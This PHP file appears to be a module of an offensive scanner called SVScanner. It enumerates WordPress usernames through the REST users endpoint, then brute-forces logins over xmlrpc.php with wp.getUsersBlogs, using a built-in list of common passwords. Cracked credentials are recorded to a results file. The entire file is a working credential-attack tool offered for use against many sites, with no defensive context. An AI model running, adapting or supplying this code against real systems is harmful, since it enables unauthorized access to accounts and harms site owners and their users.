<?php
error_reporting(0);
/**
 * @Author: Eka Syahwan
 * @Date:   2018-09-06 23:02:10
 * @Last Modified by:   shor7cut
 * @Last Modified time: 2018-09-16 13:08:45
 */
class ExploitDefaultAdmin
{
	function __construct()
	{
		$this->wploit_modules 	= new wploit_modules;
		$this->sdata 			= new Sdata;
		$this->database 		= new Database;
		$this->password 		= array('Password','12345678','abc123','passw0rd','iloveyou','letmein','starwars','whatever','123456','qwerty123','admin123','Admin123','qwerty','admin','fuckyou');
	}
	function convert_xml($data){
		return is_array(json_decode(json_encode(simplexml_load_string($data)),true));
	}
	function scanner($array_url){
		##########################################################################
		mkdir("result");
		mkdir("result/exploit");
		mkdir("result/exploit/wordpress");
		$fopn = fopen("result/exploit/wordpress/xmlrpc-passwordWeek.txt", "a+");
		##########################################################################


		echo "\r\n".$this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","Grab Username ... [ ".count($array_url)." Request ]\r\n");

		foreach ($array_url as $key => $dataURL) {
			$url[] =  array('url' 		=> $dataURL['url']."/wp-json/wp/v2/users" , 'note' =>  $dataURL['plugin']);
			$hea[] =  array('follow' 	=> true);
		}
		$respons   = $this->sdata->sdata($url,$hea); $this->sdata->session_remove($respons); unset($url);unset($hea);
		foreach ($respons as $key => $data_respons) {
			
			$_SESSION['total_size'] = ($_SESSION['total_size']+$value['info']['http_code']);
			$_SESSION['temp_size']  = ($_SESSION['temp_size']+$value['info']['http_code']);

			$json_ = json_decode($data_respons['respons'],true);
			if(is_array($json_)){
				foreach ($json_ as $key => $extrack_user) {

					$url[]  = array('url' => str_replace('/wp-json/wp/v2/users', '/xmlrpc.php', $data_respons['data']['url']) , 'note' => $extrack_user['slug'].":".$extrack_user['slug']);
					$head[] = array('post' => '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>'. $extrack_user['slug'].'</value></param><param><value>'.$extrack_user['slug'].'</value></param></params></methodCall>');

					foreach ($this->password as $key => $password) {
						$url[]  = array('url' => str_replace('/wp-json/wp/v2/users', '/xmlrpc.php', $data_respons['data']['url']) , 'note' => $extrack_user['slug'].":".$password);
						$head[] = array('post' => '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>'. $extrack_user['slug'].'</value></param><param><value>'.$password.'</value></param></params></methodCall>');
					}
					
				}
			}
		}
		echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","Trying to enter by brute force ... [ ".count($url)." Request ]\r\n");
		$respons   = $this->sdata->sdata($url,$head); $this->sdata->session_remove($respons); unset($url);unset($head);
		foreach ($respons as $key => $value) {
			
			$_SESSION['total_size'] = ($_SESSION['total_size']+$value['info']['http_code']);
			$_SESSION['temp_size']  = ($_SESSION['temp_size']+$value['info']['http_code']);

			if(preg_match('/methodResponse/', $value['respons']) && preg_match('/blogName/', $value['respons'])){
				echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("nevy","[".$value['info']['http_code']."] ".$value['info']['url'])." => ".$this->wploit_modules->color("green","[ Login Success : ". $value['data']['note']." ]")."\r\n";
				fwrite($fopn, $value['info']['url']." | ".$value['data']['note']."\r\n");
				$_SESSION['success'] = ($_SESSION['success']+1);
			}else{
				echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("nevy","[".$value['info']['http_code']."] ".$value['info']['url'])." => ".$this->wploit_modules->color("red","[ Login Failed : ". $value['data']['note']." ]")."\r\n";
				$_SESSION['failed'] = ($_SESSION['failed']+1);
			}

		}

		fclose($fopn);
		echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","Brute force Login ... Done ( Download Size : ".$this->wploit_modules->formatSizeUnits($_SESSION['temp_size'])." | Total Download : ".$this->wploit_modules->formatSizeUnits($_SESSION['total_size']).")\r\n");
		echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","[Success Login : ".$_SESSION['success']."\r\n");
		echo $this->wploit_modules->color("green","[SVScanner] ").$this->wploit_modules->color("navy","[Failed Login  : ".$_SESSION['failed']."\r\n");

		unset($_SESSION['temp_size']);

	}
}